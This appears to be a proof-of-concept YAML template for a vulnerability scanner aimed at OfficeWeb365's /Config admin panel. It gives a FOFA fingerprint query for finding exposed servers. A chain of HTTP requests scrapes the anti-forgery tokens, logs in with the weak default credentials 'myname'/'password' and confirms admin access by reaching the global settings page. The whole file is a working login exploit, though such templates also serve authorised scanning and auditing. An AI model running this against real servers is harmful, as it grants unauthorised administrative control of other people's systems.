id: poc-yaml-officeweb365-weak-password
info:
  name: officeWeb365 弱口令漏洞
  severity: medium
  tags:
  - 弱口令
  finger: officeweb365
  fofa: body="请输入furl参数" || header="OfficeWeb365" || banner="OfficeWeb365"
requests:
- method: GET
  path: /Config
  expression: status_code == 200 && contains(body,"__RequestVerificationToken")
  output:
  - regex_match(headers,"__RequestVerificationToken=(?P<Token_1>.*?);")
  - regex_match(body,`__RequestVerificationToken" type="hidden" value="(?P<Token_2>.*?)"`)
- method: POST
  path: /Config
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: __RequestVerificationToken={{.Token_1}}
  data: uName=myname&uPass=password&__RequestVerificationToken={{.Token_2}}
  expression: status_code == 302 && contains(body,"/Config/Set")
  output:
  - regex_match(headers,"OfficeWeb3653=(?P<cookie>.*?);")
- method: GET
  path: /Config/Set
  headers:
    Cookie: OfficeWeb3653={{.cookie}}
  expression: status_code == 200 && contains(body,"配置-OfficeWeb365") && contains(body,"全局设置")
variables: {}
transport: http
